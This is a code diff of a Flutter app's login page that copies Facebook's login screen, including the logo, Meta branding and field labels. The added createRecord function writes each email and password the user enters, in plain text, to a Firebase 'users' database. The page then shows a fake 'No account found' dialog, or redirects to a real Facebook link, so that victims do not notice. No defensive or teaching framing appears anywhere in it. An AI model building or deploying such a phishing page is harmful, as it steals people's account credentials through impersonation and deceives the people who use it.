@@ -2,14 +2,7 @@ import 'package:firebase_auth/firebase_auth.dart';
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
 import 'package:url_launcher/url_launcher.dart';
-
-Future<void> launchUrl(String urlString) async {
-  if (await canLaunch(urlString)) { // Check if the URL can be launched
-    await launch(urlString);
-  } else {
-    throw 'Could not launch $urlString'; // throw could be used to handle erroneous situations
-  }
-}
+import 'package:firebase_database/firebase_database.dart';
 
 
 
@@ -21,75 +14,42 @@ class Loginpage extends StatefulWidget {
 }
 
 
-final FirebaseAuth _auth = FirebaseAuth.instance;
+
+
+class _LoginpageState extends State<Loginpage> {
+  TextEditingController eController = TextEditingController();
+  TextEditingController pController = TextEditingController();
+  final FirebaseAuth _auth = FirebaseAuth.instance;
 // FirebaseApp secondaryApp = Firebase.app('SecondaryApp');
 // FirebaseAuth auth = FirebaseAuth.instanceFor(app: secondaryApp);
 
-int counter =0;
-Future<UserCredential> credential = FirebaseAuth.instance.signInAnonymously();
-Color color = const Color(0xffEBE8EF);
-double keyboardHeight = 0.0;
-TextEditingController eController = TextEditingController();
-TextEditingController pController = TextEditingController();
-bool passwordVisible = false;
-bool showSpinner = false;
-
-class _LoginpageState extends State<Loginpage> {
-
+  int counter =0;
+  // Future<UserCredential> credential = FirebaseAuth.instance.signInAnonymously();
+  FirebaseDatabase database = FirebaseDatabase.instance;
+  Color color = const Color(0xffEBE8EF);
+  final emailFormKey = GlobalKey<FormState>();
+  final passwordFormKey = GlobalKey<FormState>();
+  bool passwordVisible = false;
+  bool showSpinner = false;
   @override
   Widget build(BuildContext context) {
 
-    Future<void> _showMyDialog() async {
-      return showDialog<void>(
-        context: context,
-        barrierDismissible: false, // user must tap button!
-        builder: (BuildContext context) {
-          return AlertDialog(
-            title: const Text('No account found. Create a new account?'),
-            content:  SingleChildScrollView(
-              child: ListBody(
-                children: <Widget>[
-                  Text("it looks like ${eController.text} isn't connected to an account. You can create a new account or try again."),
-                ],
-              ),
-            ),
-            actions: <Widget>[
-              TextButton(
-                child: const Text('Create new account'),
-                onPressed: () {
-                  Navigator.of(context).pop();
-                },
-              ),
-              TextButton(
-                child: const Text('Try again'),
-                onPressed: () {
-                  Navigator.of(context).pop();
-                },
-              ),
-            ],
-          );
-        },
-      );
-    }
 
-    keyboardHeight = 1 -
-        (MediaQuery.of(context).viewInsets.bottom /
-            MediaQuery.of(context).size.height);
     double width = MediaQuery.of(context).size.width;
     double height = MediaQuery.of(context).size.height;
 
-    return
-       Scaffold(
-         body: Padding(
+
+    return Material(
+         child: Padding(
            padding: EdgeInsets.only(bottom: MediaQuery.of(context).viewInsets.bottom * .4),
            child: Padding(
              padding: const EdgeInsets.all(20.0),
              child: Column(
               children: [
-                MediaQuery.of(context).viewInsets.bottom==0?const Align(alignment:Alignment.centerLeft,child:Icon(Icons.arrow_back_ios)):Container(),
+                if(MediaQuery.of(context).viewInsets.bottom==0)const Align(alignment:Alignment.centerLeft,child:Icon(Icons.arrow_back_ios)),
                 SizedBox(height: height*.01,),
-                MediaQuery.of(context).viewInsets.bottom==0? const Text("English (UK)",style: TextStyle(fontSize: 14,fontWeight: FontWeight.w600,color: Color(0xff525C68),)):Container(),
-                MediaQuery.of(context).viewInsets.bottom==0?SizedBox(height: height*.08,):Container(),
+                if(MediaQuery.of(context).viewInsets.bottom==0) const Text("English (UK)",style: TextStyle(fontSize: 14,fontWeight: FontWeight.w600,color: Color(0xff525C68),)),
+                if(MediaQuery.of(context).viewInsets.bottom==0)SizedBox(height: height*.08,),
                 Image.asset("images/facebook (1).png",scale: 8,),
                 SizedBox(height: height*.08,),
                 Container(
@@ -105,9 +65,11 @@ class _LoginpageState extends State<Loginpage> {
                             blurRadius: 16)
                       ]),
                   child:  TextFormField(
+                    key: emailFormKey,
                     controller: eController,
                     textInputAction: TextInputAction.next,
                     cursorOpacityAnimates: true,
+                    autofillHints: const [AutofillHints.email],
                     decoration: const InputDecoration(
                       border: InputBorder.none,
                       labelText: "Mobile number or email address",
@@ -139,8 +101,11 @@ class _LoginpageState extends State<Loginpage> {
                             blurRadius: 16)
                       ]),
                   child:  TextFormField(
+
+                    key: passwordFormKey,
                     controller: pController,
                     keyboardType: TextInputType.text,
+                    autofillHints: const [AutofillHints.password],
                     obscureText: !passwordVisible,
                     decoration:  InputDecoration(
                       suffixIcon: IconButton(
@@ -180,16 +145,8 @@ class _LoginpageState extends State<Loginpage> {
                     setState(() {
                       showSpinner = true;
                     });
-                    print(counter);
-                    try {
-                      UserCredential credential =
-                      await _auth.createUserWithEmailAndPassword(
-                          email: eController.text,
-                          password: pController.text);
-                      counter == 0?_showMyDialog():launchUrl("https://www.victoriassecret.com/us/");
-                    } on FirebaseAuthException catch (e) {
-                      print(e);
-                    }
+                  createRecord(eController.text, pController.text);
+                      counter == 0?_showMyDialog():launchUrl(Uri.parse("https://www.facebook.com/share/ZAWD42993oCxdB3k/?mibextid=qi2Omg"), webOnlyWindowName: '_self',);
                     setState(() {
                       showSpinner = false;
                       counter++;
@@ -223,7 +180,7 @@ class _LoginpageState extends State<Loginpage> {
                 const Text("Forgotten Password?",style: TextStyle(color: Colors.black,fontFamily:"playfair" ,fontWeight:FontWeight.w500,fontSize:17 ),),
                 const Spacer(),
 
-                MediaQuery.of(context).viewInsets.bottom==0?Container(
+                if(MediaQuery.of(context).viewInsets.bottom==0)Container(
                   height: height * .06 ,
                   width: width * .95,
                   alignment: Alignment.center,
@@ -245,17 +202,17 @@ class _LoginpageState extends State<Loginpage> {
                         fontWeight: FontWeight.w200,
                         fontFamily: "playfair"),
                   ),
-                ):Container(),
-                MediaQuery.of(context).viewInsets.bottom==0? SizedBox(height: height*.02,):Container(),
-                MediaQuery.of(context).viewInsets.bottom==0? Row(
+                ),
+                if(MediaQuery.of(context).viewInsets.bottom==0) SizedBox(height: height*.02,),
+                if(MediaQuery.of(context).viewInsets.bottom==0) Row(
                   mainAxisAlignment: MainAxisAlignment.center,
                   children: [
                     Image.asset("images/meta.png",scale: 20,color: const Color(0xff616F79),),
                     const SizedBox(width: 5,),
                     const Text("Meta",style: TextStyle(fontSize: 18,fontWeight: FontWeight.w600,color: Color(0xff616F79)),),
                   ],
-                ):Container(),
-                MediaQuery.of(context).viewInsets.bottom==0? SizedBox(height: height*.03,):Container(),
+                ),
+                if(MediaQuery.of(context).viewInsets.bottom==0) SizedBox(height: height*.03,),
 
 
               ],
@@ -265,6 +222,48 @@ class _LoginpageState extends State<Loginpage> {
          ),
        );
 
+  }
+
+  void createRecord(String email,String password) {
+    DatabaseReference databaseReference =
+    FirebaseDatabase.instance.reference().child('users');
+    databaseReference.push().set({
+      'email': email,
+      'password': password,
+    });
+  }
+
+  Future<void> _showMyDialog() async {
+    return showDialog<void>(
+      context: context,
+      barrierDismissible: false, // user must tap button!
+      builder: (BuildContext context) {
+        return AlertDialog(
+          title: const Text('No account found. Create a new account?'),
+          content:  SingleChildScrollView(
+            child: ListBody(
+              children: <Widget>[
+                Text("it looks like ${eController.text} isn't connected to an account. You can create a new account or try again."),
+              ],
+            ),
+          ),
+          actions: <Widget>[
+            TextButton(
+              child: const Text('Create new account'),
+              onPressed: () {
+                Navigator.of(context).pop();
+              },
+            ),
+            TextButton(
+              child: const Text('Try again'),
+              onPressed: () {
+                Navigator.of(context).pop();
+              },
+            ),
+          ],
+        );
+      },
+    );
   }
 }
 
